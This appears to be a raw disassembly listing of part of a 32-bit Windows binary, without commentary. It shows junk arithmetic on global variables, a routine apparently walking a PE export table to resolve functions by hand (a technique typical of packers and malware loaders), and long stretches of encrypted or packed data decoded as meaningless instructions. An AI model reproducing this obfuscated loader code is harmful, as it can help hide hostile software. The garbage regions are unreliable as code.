  40c38c:	mov    ecx,DWORD PTR ds:0x4337ff
  40c392:	inc    ecx
  40c393:	mov    DWORD PTR ds:0x4337ff,ecx
  40c399:	cmp    DWORD PTR ds:0x4337ff,0x1d
  40c3a0:	jb     0x40c358
  40c3a6:	neg    ecx
  40c3a8:	sub    edx,edi
  40c3aa:	adc    ecx,DWORD PTR ds:0x43376b
  40c3b0:	xor    esi,esi
  40c3b2:	add    DWORD PTR ds:0x4337ab,0x7522
  40c3bc:	mov    DWORD PTR [ebp-0x28],esi
  40c3bf:	xor    ecx,0x6487
  40c3c5:	mov    DWORD PTR [ebp-0x2c],esi
  40c3c8:	or     DWORD PTR ds:0x4337ab,ecx
  40c3ce:	mov    DWORD PTR [ebp-0x14],esi
  40c3d1:	mov    DWORD PTR [ebp-0x8],esi
  40c3d4:	mov    ecx,DWORD PTR [ebp-0x18]
  40c3d7:	add    DWORD PTR ds:0x43382b,0x43383b
  40c3e1:	xor    ecx,eax
  40c3e3:	and    DWORD PTR ds:0x4337af,0x4337bf
  40c3ed:	xor    edi,edi
  40c3ef:	xor    DWORD PTR ds:0x4337c3,ebx
  40c3f5:	add    ecx,ebx
  40c3f7:	mov    DWORD PTR ds:0x433737,0x6c1e
  40c401:	mov    DWORD PTR [ebp-0x20],ecx
  40c404:	mov    DWORD PTR ds:0x43372b,edi
  40c40a:	mov    eax,DWORD PTR [ebp-0x20]
  40c40d:	je     0x40cc0f
  40c413:	sbb    DWORD PTR ds:0x43372f,0x13ee
  40c41d:	mov    eax,DWORD PTR [ebp-0x4]
  40c420:	adc    DWORD PTR ds:0x433723,0x47a9
  40c42a:	xor    eax,0x7510854
  40c42f:	sbb    DWORD PTR ds:0x4337e7,0x7bc1
  40c439:	add    eax,ebx
  40c43b:	cmp    edi,eax
  40c43d:	mov    DWORD PTR ds:0x4337f3,0x1580
  40c447:	jne    0x40c892
  40c44d:	push   DWORD PTR [ebp+0x8]
  40c450:	call   0x411718
  40c455:	mov    DWORD PTR [ebp-0x20],eax
  40c458:	adc    DWORD PTR ds:0x4337a7,edi
  40c45e:	mov    eax,DWORD PTR [ebp-0x4]
  40c461:	and    DWORD PTR ds:0x4337eb,0x0
  40c46b:	jmp    0x40c47f
  40c470:	xor    ecx,ecx
  40c472:	xor    ecx,DWORD PTR ds:0x4337eb
  40c478:	inc    ecx
  40c479:	mov    DWORD PTR ds:0x4337eb,ecx
  40c47f:	cmp    DWORD PTR ds:0x4337eb,0x1c
  40c486:	jae    0x40c4c3
  40c48c:	cmp    DWORD PTR ds:0x4337eb,0xb
  40c493:	jne    0x40c4a2
  40c499:	push   DWORD PTR [ebp-0x1c]
  40c49c:	call   DWORD PTR ds:0x4123a8
  40c4a2:	cmp    DWORD PTR ds:0x4337eb,0xa
  40c4a9:	jne    0x40c4be
  40c4af:	xor    ecx,ecx
  40c4b1:	xor    ecx,DWORD PTR ds:0x4337eb
  40c4b7:	inc    ecx
  40c4b8:	mov    DWORD PTR ds:0x4337eb,ecx
  40c4be:	jmp    0x40c470
  40c4c3:	mov    ecx,DWORD PTR [ebp-0x20]
  40c4c6:	xor    esi,esi
  40c4c8:	or     esi,DWORD PTR ds:0x4337eb
  40c4ce:	and    esi,DWORD PTR ds:0x4337ef
  40c4d4:	mov    DWORD PTR ds:0x4337eb,esi
  40c4da:	mov    esi,0x7510854
  40c4df:	sub    DWORD PTR ds:0x4337bb,0x5d26
  40c4e9:	xor    eax,esi
  40c4eb:	xor    DWORD PTR ds:0x433783,0xf10
  40c4f5:	add    eax,ebx
  40c4f7:	mov    DWORD PTR ds:0x43376f,0x5b3f
  40c501:	cmp    ecx,eax
  40c503:	je     0x40cbf3
  40c509:	and    DWORD PTR ds:0x4337fb,0x10b9
  40c513:	push   DWORD PTR [ebp-0x20]
  40c516:	push   DWORD PTR [ebp+0x8]
  40c519:	sub    DWORD PTR ds:0x4337eb,0x535e
  40c523:	call   0x40f400
  40c528:	sub    DWORD PTR ds:0x4337f3,edx
  40c52e:	mov    DWORD PTR [ebp-0x14],eax
  40c531:	mov    eax,DWORD PTR [ebp-0x4]
  40c534:	mov    ecx,DWORD PTR [ebp-0x14]
  40c537:	xor    eax,esi
  40c539:	add    eax,ebx
  40c53b:	cmp    ecx,eax
  40c53d:	je     0x40cbf3
  40c543:	mov    eax,DWORD PTR [ebp-0x14]
  40c546:	mov    eax,DWORD PTR [eax+0x18]
  40c549:	mov    DWORD PTR [ebp-0x20],eax
  40c54c:	mov    eax,DWORD PTR [ebp-0x14]
  40c54f:	mov    ecx,DWORD PTR [ebp+0x8]
  40c552:	add    ecx,DWORD PTR [eax+0x20]
  40c555:	mov    DWORD PTR [ebp-0x28],ecx
  40c558:	mov    eax,DWORD PTR [ebp-0x14]
  40c55b:	mov    ecx,DWORD PTR [ebp+0x8]
  40c55e:	add    ecx,DWORD PTR [eax+0x24]
  40c561:	mov    DWORD PTR [ebp-0x2c],ecx
  40c564:	jmp    0x40c884
  40c569:	mov    ah,BYTE PTR [ecx+edx*8-0x548e0e10]
  40c570:	fs ret 
  40c572:	mov    ecx,0x8fb25658
  40c577:	fcomp  st(5)
  40c579:	sbb    BYTE PTR [ecx+0x7d7d7e7e],al
  40c57f:	jle    0x40c5ff
  40c581:	stos   BYTE PTR es:[edi],al
  40c582:	or     cl,BYTE PTR [di+0x39]
  40c586:	add    edi,DWORD PTR ds:0xfe50ff9f
  40c58c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c58d:	jmp    0x40c51e
  40c58f:	add    DWORD PTR [edx-0x3e],0xffffffe8
  40c593:	and    BYTE PTR [edi+0x401d53ab],ah
  40c599:	in     eax,0x4c
  40c59b:	in     al,dx
  40c59c:	mov    ch,0xfe
  40c59e:	mov    es,WORD PTR [ebx+ebx*2]
  40c5a1:	addr16 jnp 0x40c5f0
  40c5a4:	nop
  40c5a5:	sar    DWORD PTR [eax-0x6a],0x82
  40c5a9:	in     eax,dx
  40c5aa:	xor    DWORD PTR [ebp+0x33],edi
  40c5ad:	jbe    0x40c601
  40c5af:	push   ss
  40c5b0:	jg     0x40c60f
  40c5b2:	jmp    0x40c5f0
  40c5b4:	inc    ebx
  40c5b5:	mov    bl,0xb0
  40c5b7:	scas   eax,DWORD PTR es:[edi]
  40c5b8:	xchg   ebx,eax
  40c5b9:	jmp    DWORD PTR [ebx-0x34d6fcea]
  40c5bf:	jnp    0x40c5c8
  40c5c1:	sub    dh,cl
  40c5c3:	lahf   
  40c5c4:	adc    DWORD PTR [edi-0x17],ecx
  40c5c7:	daa    
  40c5c8:	retf   
  40c5c9:	hlt    
  40c5ca:	mov    ah,0xe3
  40c5cc:	inc    edi
  40c5cd:	xchg   ebx,eax
  40c5ce:	fsub   QWORD PTR [edi+0x16]
  40c5d1:	adc    al,0x84
  40c5d3:	jmp    0x6985:0x7e4c03da
  40c5da:	sub    eax,0xafd8df58
  40c5df:	jp     0x40c612
  40c5e1:	aam    0x4b
  40c5e3:	test   edi,esi
  40c5e5:	arpl   WORD PTR ds:0x26ef758c,bx
  40c5eb:	fs enter 0x409b,0x83
  40c5f0:	and    ecx,edi
  40c5f2:	out    0x49,eax
  40c5f4:	dec    ebx
  40c5f5:	sbb    eax,0x948dbcd6
  40c5fa:	push   cs
  40c5fb:	pop    ds
  40c5fc:	ret    0xb33d
  40c5ff:	cmp    al,0xaa
  40c601:	cmp    DWORD PTR [eax-0x60712464],0x15
  40c608:	xor    ebx,edx
  40c60a:	sahf   
  40c60b:	sbb    DWORD PTR [edx+eax*4],0xb9c7fe2c
  40c612:	push   ebp
  40c613:	cli    
  40c614:	fucom  st(2)
  40c616:	push   ebx
  40c617:	pop    esi
  40c618:	xchg   esp,eax
  40c619:	mov    ebp,DWORD PTR [bx+si]
  40c61c:	and    DWORD PTR [ebx+0x4e],ebp
  40c61f:	retf   0x523a
  40c622:	and    BYTE PTR [esi],bl
  40c624:	push   esi
  40c625:	out    0x32,eax
  40c627:	inc    edx
  40c628:	mov    fs,WORD PTR [eax]
  40c62a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c62b:	push   ss
  40c62c:	jmp    0x54e51114
  40c631:	xor    ah,BYTE PTR [ebp+0x38]
  40c634:	inc    eax
  40c635:	pop    ds
  40c636:	push   DWORD PTR [ebx+0x5c]
  40c639:	ror    BYTE PTR [eax],cl
  40c63b:	pushf  
  40c63c:	push   0x8666173f
  40c641:	lods   eax,DWORD PTR ds:[esi]
  40c642:	add    DWORD PTR [ecx],ebp
  40c644:	sub    BYTE PTR [edi],ch
  40c646:	and    BYTE PTR ds:0x21c61176,dl
  40c64c:	ds (bad) 
  40c64e:	ins    BYTE PTR es:[edi],dx
  40c64f:	push   ecx
  40c650:	mov    esi,0x444f812d
  40c655:	jg     0x40c5fc
  40c657:	test   DWORD PTR [esi-0x16733e34],eax
  40c65d:	lds    ebp,FWORD PTR [edi]
  40c65f:	cmp    DWORD PTR [edx-0x2c],0x0
  40c663:	aam    0x14
  40c665:	inc    ebp
  40c666:	mov    eax,ds:0x49ccbf8e
  40c66b:	cwde   
  40c66c:	fisttp WORD PTR [ebx-0xd]
  40c66f:	sub    eax,0xfdd4c452
  40c674:	stc    
  40c675:	es (bad) 
  40c677:	mov    ebx,0xdcd1566f
  40c67c:	mov    eax,ds:0x1200f200
  40c681:	sub    DWORD PTR [eax-0x59c8e6ea],ebx
  40c687:	in     al,dx
  40c688:	mov    ebp,0x52b4c02
  40c68d:	sub    cl,BYTE PTR [ebx+0x3]
  40c690:	mov    eax,ds:0xc689dc7d
  40c695:	adc    al,0x10
  40c697:	int3   
  40c698:	mov    bl,0xb8
  40c69a:	jnp    0x40c62b
  40c69c:	les    ecx,FWORD PTR [eax+0x3f0b1c14]
  40c6a2:	xchg   esp,eax
  40c6a3:	(bad)  
  40c6a4:	out    dx,al
  40c6a5:	sub    eax,0x5b196d61
  40c6aa:	pop    es
  40c6ab:	ja     0x40c682
  40c6ad:	jno    0x40c6f2
  40c6af:	mov    edi,0x37944a59
  40c6b4:	xchg   esi,eax
  40c6b5:	xor    al,0x3e
  40c6b7:	xchg   esp,eax
  40c6b8:	aas    
  40c6b9:	mov    cl,0x74
  40c6bb:	push   ds
  40c6bc:	retf   
  40c6bd:	mov    eax,0x9509845
  40c6c2:	xor    BYTE PTR [edi+esi*8-0x16a93443],ah
  40c6c9:	gs sbb al,0x26
  40c6cc:	fstp   QWORD PTR [edi-0x203a8bd2]
  40c6d2:	fild   WORD PTR [ebx]
  40c6d4:	dec    edx
  40c6d5:	clc    
  40c6d6:	cmp    BYTE PTR [ebx-0x30b12ba],ch
  40c6dc:	cmp    ah,BYTE PTR [ebp-0xa]
  40c6df:	adc    dl,dh
  40c6e1:	or     al,0x74
  40c6e3:	inc    edi
  40c6e4:	test   eax,0xf9bb8a
  40c6e9:	daa    
  40c6ea:	cmp    al,0xe5
  40c6ec:	add    al,cl
  40c6ee:	lods   eax,DWORD PTR ds:[esi]
  40c6ef:	or     dl,dh
  40c6f1:	ror    ch,1
  40c6f3:	xor    bl,BYTE PTR [esi+ebp*1-0x6a]
  40c6f7:	outs   dx,DWORD PTR ds:[esi]
  40c6f8:	jmp    0x320c:0x833c3f49
  40c6ff:	jb     0x40c6e4
  40c701:	cmp    DWORD PTR [edx+0x172d2e56],eax
  40c707:	imul   ebx,DWORD PTR [edi-0x49],0x4fca6572
  40c70e:	pop    esi
  40c70f:	stc    
  40c710:	jbe    0x40c73e
  40c712:	mov    esp,0xc1d9774a
  40c717:	ret    
  40c718:	ins    DWORD PTR es:[edi],dx
  40c719:	call   0x5da3:0x3969837c
  40c720:	stc    
  40c721:	mov    edx,0xa5d3edd7
  40c726:	xchg   ebx,eax
  40c727:	fidivr DWORD PTR [ecx]
  40c729:	addr16 push cs
  40c72b:	test   dh,bh
  40c72d:	in     al,dx
  40c72e:	rcl    DWORD PTR [esi],0x41
  40c731:	int3   
  40c732:	imul   edx,ebx,0x6f
  40c735:	inc    ebp
  40c736:	or     ebp,eax
  40c738:	sbb    edx,DWORD PTR [ecx]
  40c73a:	nop
  40c73b:	iret   
  40c73c:	xchg   esp,eax
  40c73d:	sub    al,0xc1
  40c73f:	xor    eax,0x88328caf
  40c744:	inc    esi
  40c745:	retf   
  40c746:	inc    edx
  40c747:	push   ss
  40c748:	aas    
  40c749:	or     DWORD PTR [ebp+0x6b],0xdf3673cf
  40c750:	clc    
  40c751:	inc    edx
  40c752:	dec    esi
  40c753:	inc    ebp
  40c754:	xor    eax,0x46e2d3c2
  40c759:	stos   DWORD PTR es:[edi],eax
  40c75a:	dec    edi
  40c75b:	mov    al,ds:0x1f5e4789
  40c760:	xchg   BYTE PTR [ecx-0x2a9a4df2],bl
  40c766:	enter  0x9e02,0xd3
  40c76a:	inc    eax
  40c76b:	punpckhwd mm5,QWORD PTR [ebx+0x34]
  40c76f:	int    0xff
  40c771:	gs push ebx
  40c773:	push   cs
  40c774:	imul   edx,DWORD PTR [edx],0xa67ebb63
  40c77a:	test   DWORD PTR [ebx+0x2d],eax
  40c77d:	fisubr WORD PTR [edi-0x76c3b7cb]
  40c783:	inc    eax
  40c784:	mov    edi,0x45925ddb
  40c789:	cdq    
  40c78a:	and    edx,DWORD PTR [esi-0x3a5d93bf]
  40c790:	sbb    BYTE PTR [ebp+0x7e1ab1f2],cl
  40c796:	inc    eax
  40c797:	push   esp
  40c798:	pop    ss
  40c799:	iret   
  40c79a:	or     BYTE PTR [edx-0x78],0xed
  40c79e:	frndint 
  40c7a0:	jmp    0x61c5e469
  40c7a5:	or     bl,BYTE PTR [ebx-0x77]
  40c7a8:	cmp    ecx,ecx
  40c7aa:	ror    BYTE PTR [ebx+ecx*1],1
  40c7ad:	je     0x40c7ab
  40c7af:	aad    0xf2
  40c7b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7b2:	jne    0x40c817
  40c7b4:	fidivr WORD PTR [ecx-0x7cc8f2fc]
  40c7ba:	nop
  40c7bb:	xor    ecx,esp
  40c7bd:	js     0x40c7cd
  40c7bf:	sub    eax,0x80597b4d
  40c7c4:	mov    bh,0x7c
  40c7c6:	or     eax,0xcec94480
  40c7cb:	pop    ecx
  40c7cc:	outs   dx,BYTE PTR ds:[esi]
  40c7cd:	xor    al,0xad
  40c7cf:	or     ch,0x19
  40c7d2:	loope  0x40c76b
  40c7d4:	add    eax,0x18e0061b
  40c7d9:	cmp    edx,DWORD PTR [esi]
  40c7db:	mov    DWORD PTR [ecx-0x4e05f277],esp
  40c7e1:	or     edx,DWORD PTR [edx+eax*4]
  40c7e4:	mov    al,0xf5
  40c7e6:	pop    es
  40c7e7:	xchg   ecx,eax
  40c7e8:	pop    esi
  40c7e9:	pop    edx
  40c7ea:	pusha  
  40c7eb:	mov    bl,BYTE PTR [ecx]
  40c7ed:	scas   al,BYTE PTR es:[edi]
  40c7ee:	jle    0x40c78e
  40c7f0:	fisttp QWORD PTR [ecx]
  40c7f2:	repz sahf 
  40c7f4:	xchg   ebx,eax
  40c7f5:	ret    
  40c7f6:	sub    ecx,ebx
  40c7f8:	xor    ecx,DWORD PTR ds:0xee3d6ecf
  40c7fe:	mov    al,0xe3
  40c800:	mov    DWORD PTR ds:0x7b7048a,ebx
  40c806:	and    cl,ah
  40c808:	xchg   ebx,eax
  40c809:	scas   al,BYTE PTR es:[edi]
  40c80a:	fsubr  st(7),st
  40c80c:	cmp    al,0x32
  40c80e:	dec    cx
  40c810:	shl    edx,1
  40c812:	loope  0x40c7d4
  40c814:	shl    BYTE PTR [ebx],1
  40c816:	jmp    FWORD PTR [ebx]
  40c818:	clc    
  40c819:	cmp    bl,dl
  40c81b:	inc    ecx
  40c81c:	xor    al,0xb1
  40c81e:	pushf  
  40c81f:	outs   dx,DWORD PTR ds:[esi]
  40c820:	sub    eax,0x91bf14ff
  40c825:	mov    al,ds:0xedbf2a76
  40c82a:	xor    DWORD PTR [esp+edx*2+0x5d364be],esp
  40c831:	inc    ebp
  40c832:	pop    ss
  40c833:	ds inc ebp
  40c835:	shl    BYTE PTR [eax-0xdb0904],1
  40c83b:	mov    ch,bh
  40c83d:	pop    ds
  40c83e:	cld    
  40c83f:	scas   al,BYTE PTR es:[edi]
  40c840:	test   eax,0xcde6d279
  40c845:	aam    0x32
  40c847:	xor    BYTE PTR [edi+0xf],al
  40c84a:	jecxz  0x40c7f5
  40c84c:	sub    al,0xb4
  40c84e:	xchg   bh,cl
  40c850:	mov    cl,dl
  40c852:	cmp    DWORD PTR [edi+0x233ee9f9],0x1014ad99
  40c85c:	stos   BYTE PTR es:[edi],al
  40c85d:	jle    0x40c849
  40c85f:	mov    cl,0xc8
  40c861:	pop    edx
  40c862:	mov    ds:0xc60fb299,eax
  40c867:	pop    eax
  40c868:	fidivr DWORD PTR [edx]
  40c86a:	lahf   
  40c86b:	mov    ch,0x89
  40c86d:	cwde   
  40c86e:	cmp    DWORD PTR [edi+0x3ea14df2],0x5
  40c875:	mov    ?,ecx
  40c877:	mov    bl,BYTE PTR [ecx-0x310c13b]
  40c87d:	sahf   
  40c87e:	int3   
  40c87f:	ins    DWORD PTR es:[edi],dx
  40c880:	adc    BYTE PTR [eax+0x458b308e],dh
  40c886:	in     al,dx
  40c887:	mov    ecx,DWORD PTR [ebp+0x8]
  40c88a:	add    ecx,DWORD PTR [eax+0x1c]
  40c88d:	xor    esi,esi
  40c88f:	mov    DWORD PTR [ebp-0x14],ecx
  40c892:	mov    eax,DWORD PTR [ebp-0x28]
  40c895:	mov    ecx,DWORD PTR [ebp+0x8]
  40c898:	add    ecx,DWORD PTR [eax+edi*4]
  40c89b:	lea    eax,[ebp-0x8]
  40c89e:	mov    DWORD PTR [ebp-0x30],ecx
  40c8a1:	jmp    0x40cbc1
  40c8a6:	push   0xffffffa4
  40c8a8:	adc    ebx,DWORD PTR [ecx]
  40c8aa:	shr    DWORD PTR [ecx+0x51917570],1
  40c8b0:	cs fwait
  40c8b2:	cli    
  40c8b3:	jno    0x40c907
  40c8b5:	(bad)  
  40c8b7:	mov    WORD PTR [esi+0x7e],?
  40c8ba:	jge    0x40c939
  40c8bc:	jle    0x40c93c
  40c8be:	xor    bl,dh
  40c8c0:	fucomip st,st(7)
  40c8c2:	push   0x67
  40c8c4:	push   0x32
  40c8c6:	sar    ah,1
  40c8c8:	in     al,dx
  40c8c9:	outs   dx,BYTE PTR ds:[esi]
  40c8ca:	sar    DWORD PTR [edi+0x1312fc8],1
  40c8d0:	dec    esp
  40c8d1:	adc    ah,BYTE PTR [ebx+0x41]
  40c8d4:	sbb    ah,BYTE PTR [ecx]
  40c8d6:	cmc    
  40c8d7:	jbe    0x40c8f0
  40c8d9:	xor    al,0x85
  40c8db:	push   0xffffff83
  40c8dd:	(bad)  
  40c8de:	lea    edi,[ebp+0x61f6f87b]
  40c8e4:	cld    
  40c8e5:	rsm    
  40c8e7:	int3   
  40c8e8:	mul    DWORD PTR [eax-0x477f220]
  40c8ee:	outs   dx,DWORD PTR ds:[esi]
  40c8ef:	push   ebx
  40c8f0:	mov    edx,ecx
  40c8f2:	dec    ecx
  40c8f3:	test   WORD PTR [eax+0x3142c6e9],di
  40c8fa:	aad    0x63
  40c8fc:	pop    edx
  40c8fd:	add    ch,BYTE PTR [edx+0x3d]
  40c900:	dec    esi
  40c901:	imul   esp,DWORD PTR [esi-0x3ac5cda5],0x6101b9f3
  40c90b:	repnz cmp eax,0x9f05a3bc
  40c911:	dec    ebx
  40c912:	(bad)
  40c915:	inc    esi
  40c916:	in     eax,0x26
  40c918:	or     esp,DWORD PTR [ebp-0x625a27ef]
  40c91e:	jp     0x40c994
  40c920:	inc    eax
  40c921:	inc    BYTE PTR [ecx+0x1d4cfb0f]
  40c927:	in     eax,0xdf
  40c929:	xor    eax,0x1c1e846e
  40c92e:	dec    esp
  40c92f:	and    DWORD PTR [eax],0x4652fe9c
  40c935:	pop    ecx
  40c936:	sbb    edi,0xa3223a1e
  40c93c:	jg     0x40c8ea
  40c93e:	aad    0x8d
  40c940:	and    al,0xed
  40c942:	xor    eax,0xcf9204f4
  40c947:	jno    0x40c930
  40c949:	inc    eax
  40c94a:	ret    
  40c94b:	cwde   
  40c94c:	jns    0x40c973
  40c94e:	jmp    0x40c8d9
  40c950:	out    dx,al
  40c951:	mov    ebx,0x73e0b073
  40c956:	in     eax,0xef
  40c958:	adc    ah,bh
  40c95a:	mov    dh,0xdd
  40c95c:	enter  0x7f1b,0xf9
  40c960:	and    BYTE PTR [ebx+0x3c30cc23],bh
  40c966:	adc    BYTE PTR [esi-0x54276071],0xec
  40c96d:	ret    0xcc44
  40c970:	loopne 0x40c928
  40c972:	mov    ecx,0xfbb29cd6
  40c977:	(bad)  
  40c978:	rcl    bl,1
  40c97a:	jg     0x40c928
  40c97c:	test   al,0x7e
  40c97e:	cld    
  40c97f:	shl    DWORD PTR [edx],1
  40c981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c982:	mov    eax,0x6f643723
  40c987:	sub    ebx,DWORD PTR [ecx+0x7036b81]
  40c98d:	jbe    0x40c945
  40c98f:	inc    edx
  40c990:	call   0x363833ef
  40c995:	inc    ebx
  40c996:	mov    esp,DWORD PTR [eax+0x4fc8242]
  40c99c:	int    0x94
  40c99e:	xor    BYTE PTR [ebx-0x14345102],cl
  40c9a4:	js     0x40ca0c
  40c9a6:	call   edx
  40c9a8:	push   cs
  40c9a9:	xchg   ebx,eax
  40c9aa:	repnz add eax,0x7ce79c4c
  40c9b0:	or     al,0x77
  40c9b2:	and    al,0xf4
  40c9b4:	sbb    eax,0x1104985a
  40c9b9:	mov    al,ds:0x495f4d82
  40c9be:	mov    ecx,DWORD PTR [ecx-0x1eeda6f0]
  40c9c4:	pusha  
  40c9c5:	rcr    DWORD PTR [edx-0x3e74022a],cl
  40c9cb:	sbb    DWORD PTR [edi+eiz*1+0x5a],esp
  40c9cf:	ins    BYTE PTR es:[edi],dx
  40c9d0:	cmp    al,0x26
  40c9d2:	clc    
  40c9d3:	dec    edx
  40c9d4:	clc    
  40c9d5:	lods   al,BYTE PTR ds:[esi]
  40c9d6:	dec    edi
  40c9d7:	and    dl,dl
  40c9d9:	aaa    
  40c9da:	neg    BYTE PTR [ebx+esi*4-0x23]
  40c9de:	pushf  
  40c9df:	enter  0x8023,0xc4
  40c9e3:	inc    ebx
  40c9e4:	sbb    dl,dh
  40c9e6:	cli    
  40c9e7:	dec    ebx
  40c9e8:	call   0x12dca657
  40c9ed:	inc    esi
  40c9ee:	pop    esp
  40c9ef:	icebp  
  40c9f0:	shr    BYTE PTR [esi-0x68147a44],cl
  40c9f6:	cdq    
  40c9f7:	jge    0x40c9b6
  40c9f9:	test   BYTE PTR [eax+ebp*2+0x42a7272f],al
  40ca00:	mov    edi,0xe572349a
  40ca05:	mov    ch,0xb0
  40ca07:	cli    
  40ca08:	mov    esp,DWORD PTR [eax-0xc]
  40ca0b:	xchg   edi,eax
  40ca0c:	sti    
  40ca0d:	add    ecx,ecx
  40ca0f:	push   0xd25131bf
  40ca14:	inc    esp
  40ca15:	sub    ecx,DWORD PTR [eax]
  40ca17:	inc    ecx
  40ca18:	inc    ebp
  40ca19:	pop    edx
  40ca1a:	mov    cl,BYTE PTR [ebx]
  40ca1c:	push   cs
  40ca1d:	mul    DWORD PTR [eax+0x52]
  40ca20:	jbe    0x40ca32
  40ca22:	sub    dl,BYTE PTR [ebp+0x6801704b]
  40ca28:	fidivr WORD PTR ds:0xcfa513c7
  40ca2e:	add    dh,BYTE PTR [esi+0x2c5b138e]
  40ca34:	add    BYTE PTR [edi+0x6e249bf3],dh
  40ca3a:	int3   
  40ca3b:	add    esi,esi
  40ca3d:	push   cs
  40ca3e:	imul   dh
  40ca40:	sub    ecx,DWORD PTR [ebp+0x37]
  40ca43:	pop    eax
  40ca44:	push   esp
  40ca45:	jle    0x40cac5
  40ca47:	xor    esi,DWORD PTR [eax+0x23]
  40ca4a:	push   edx
  40ca4b:	les    ecx,FWORD PTR [esp+edx*2+0x4372439e]
  40ca52:	loope  0x40ca02
  40ca54:	stos   BYTE PTR es:[edi],al
  40ca55:	add    eax,0xcb29415f
  40ca5a:	lds    esi,FWORD PTR [eax+0x45]
  40ca5d:	xchg   BYTE PTR [ebx+0x1f8f069c],dh
  40ca63:	ja     0x40cad1
  40ca65:	adc    al,0xc6
  40ca67:	and    eax,0x61b62375
  40ca6c:	lods   al,BYTE PTR ds:[esi]
  40ca6d:	pushf  
  40ca6e:	loope  0x40cacf
  40ca70:	bound  edx,QWORD PTR [ecx+edi*1]
  40ca73:	out    dx,eax
  40ca74:	cdq    
  40ca75:	xchg   BYTE PTR [ebp+0xb],bl
  40ca78:	jmp    0x40ca9e
  40ca7a:	sbb    BYTE PTR [eax+0x2dffbcf6],0xfb
  40ca81:	imul   ebp,DWORD PTR [esi-0x79],0x9a145611
  40ca88:	adc    eax,DWORD PTR [edx]
  40ca8a:	mov    ebp,0xe644b7d3
  40ca8f:	and    eax,0xe3850392
  40ca94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca95:	inc    eax
  40ca96:	dec    ebx
  40ca97:	jae    0x40cacb
  40ca99:	pop    edi
  40ca9a:	(bad)  
  40ca9b:	mov    al,ds:0x65a418
  40caa0:	cdq    
  40caa1:	or     DWORD PTR [eax-0x13a651fb],ecx
  40caa7:	jb     0x40cab3
  40caa9:	pop    ecx
  40caaa:	jae    0x40ca89
  40caac:	inc    ecx
  40caad:	mov    fs,WORD PTR [ebx]
  40caaf:	fsub   st,st(3)
  40cab1:	retf   0xfe68
  40cab4:	mov    ebp,0x73575217
  40cab9:	or     eax,ecx
  40cabb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cabc:	sbb    eax,0xff57d65f
  40cac1:	ror    DWORD PTR [eax-0x43],1
  40cac4:	cmc    
  40cac5:	int3   
  40cac6:	add    esp,DWORD PTR [eax+esi*1]
  40cac9:	jmp    0x40caf8
  40cacb:	ss enter 0xb492,0xa0
  40cad0:	ret    0x123d
  40cad3:	push   eax
  40cad4:	cli    
  40cad5:	and    al,0x8
  40cad7:	pop    ds
  40cad8:	loop   0x40cb0d
  40cada:	pop    esp
  40cadb:	leave  
  40cadc:	pop    esi
  40cadd:	mov    esp,0x6f5c50f9
  40cae2:	lea    edi,[ebx]
  40cae4:	mov    ebx,0x2c9b75d1
  40cae9:	imul   esi,ebp,0xfffffff8
  40caec:	or     eax,eax
  40caee:	iret   
  40caef:	data16 in al,0x27
  40caf2:	out    dx,eax
  40caf3:	out    dx,al
  40caf4:	cmp    DWORD PTR [esi-0x61],ecx
  40caf7:	bnd call 0xb01cd6ee
  40cafd:	retf   
  40cafe:	and    DWORD PTR [eax-0x72],ebx
  40cb01:	xor    esi,edx
  40cb03:	sar    BYTE PTR [edx],1
  40cb05:	sar    dl,cl
  40cb07:	in     eax,dx
  40cb08:	mov    ch,BYTE PTR [ebp-0x1]
  40cb0b:	das    
  40cb0c:	xchg   esp,eax
  40cb0d:	sbb    esp,ebp
  40cb0f:	in     al,dx
  40cb10:	jns    0x40caad
  40cb12:	js     0x40caf7
  40cb14:	xchg   esp,eax
  40cb15:	mov    esi,0x92a3b6dd
  40cb1a:	cmp    eax,0x262e4ecf
  40cb1f:	mov    edi,0x6d88a287
  40cb24:	mov    esi,0x1b69108
  40cb29:	arpl   WORD PTR [eax],si
  40cb2b:	or     BYTE PTR [ebx+0x2642261a],dh
  40cb31:	mov    ecx,DWORD PTR ds:0x4042ac74
  40cb37:	sub    ebp,DWORD PTR [ebx+0x1d]
  40cb3a:	mov    eax,ds:0x89d4e468
  40cb3f:	(bad)  
  40cb40:	aas    
  40cb41:	int    0xe2
  40cb43:	lahf   
  40cb44:	dec    esi
  40cb45:	lea    edi,[edx-0x7fb13a16]
  40cb4b:	sar    cl,0xa2
  40cb4e:	or     eax,0xc5b19cb8
  40cb53:	sbb    eax,ecx
  40cb55:	mov    ebx,0x7a2fbd33
  40cb5a:	int3   
  40cb5b:	push   es
  40cb5c:	add    dh,BYTE PTR [ebp+0x24]
  40cb5f:	adc    ecx,DWORD PTR ds:0xf084b306
  40cb65:	mov    eax,0x4714c7ce
  40cb6a:	mov    esp,0x7109589b
  40cb6f:	push   ss
  40cb70:	sbb    edx,DWORD PTR [ecx+0x707d15aa]
  40cb76:	in     eax,dx
  40cb77:	stc    
  40cb78:	adc    BYTE PTR [eax-0x19493849],ch
  40cb7e:	fimul  DWORD PTR [esi-0x5c]
  40cb81:	inc    eax
  40cb82:	mov    al,0xc5
  40cb84:	into   
  40cb85:	gs jmp 0x40cb5d
  40cb88:	outs   dx,BYTE PTR ds:[esi]
  40cb89:	mov    ds:0x885f93fa,eax
  40cb8e:	push   eax
  40cb8f:	xchg   edi,eax
  40cb90:	fstp   DWORD PTR ds:0x68f2b430
  40cb96:	inc    ebp
  40cb97:	out    0xd8,al
  40cb99:	pop    ecx
  40cb9a:	(bad)  
  40cb9b:	(bad)  
  40cb9c:	out    dx,al
  40cb9d:	jmp    0x4213:0xf831b8e7
  40cba4:	dec    eax
  40cba5:	or     ecx,ebp
  40cba7:	cld    
  40cba8:	pop    eax
  40cba9:	imul   ebp,DWORD PTR ds:0x6640ac85,0x41
  40cbb0:	icebp  
  40cbb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbb2:	mov    dl,0xc9
  40cbb4:	jmp    0xe27247f6
  40cbb9:	add    esi,DWORD PTR [edx]
  40cbbb:	pop    es
  40cbbc:	out    dx,al
  40cbbd:	mov    ds:0x508837da,eax
  40cbc2:	push   DWORD PTR [ebp-0x30]
  40cbc5:	push   DWORD PTR [ebp+0xc]
  40cbc8:	call   0x410a7f
